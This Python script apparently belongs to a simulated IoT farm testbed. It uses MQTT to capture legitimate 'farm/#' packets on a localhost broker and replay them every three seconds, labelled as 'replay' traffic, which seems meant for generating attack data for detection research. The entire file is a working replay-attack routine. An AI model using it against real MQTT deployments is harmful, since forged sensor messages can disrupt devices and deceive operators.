import json
import threading
import time
from collections import deque
from paho.mqtt import client as mqtt_client

BROKER = "localhost"
PORT = 1883

client = mqtt_client.Client(
    mqtt_client.CallbackAPIVersion.VERSION2,
    client_id="replay-attacker"
)

client.connect(BROKER, PORT)
client.loop_start()

# Store last 20 legitimate packets
packet_buffer = deque(maxlen=20)
running = False

def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())

        # Ignore attack packets
        if data.get("packet_type") == "normal":
            packet_buffer.append((msg.topic, data))
    except:
        pass

client.subscribe("farm/#")
client.on_message = on_message

def replay_loop():
    while running:
        if packet_buffer:
            topic, packet = packet_buffer[0]

            replay_packet = packet.copy()
            replay_packet["device"] = "replay-attacker"
            replay_packet["packet_type"] = "replay"
            replay_packet["timestamp"] = time.time()

            client.publish(topic, json.dumps(replay_packet))
            print(f"🔁 Replayed [{topic}] -> {replay_packet}")

        time.sleep(3)

def start_replay_attack():
    global running
    if running:
        return
    running = True
    threading.Thread(target=replay_loop, daemon=True).start()

def stop_replay_attack():
    global running
    running = False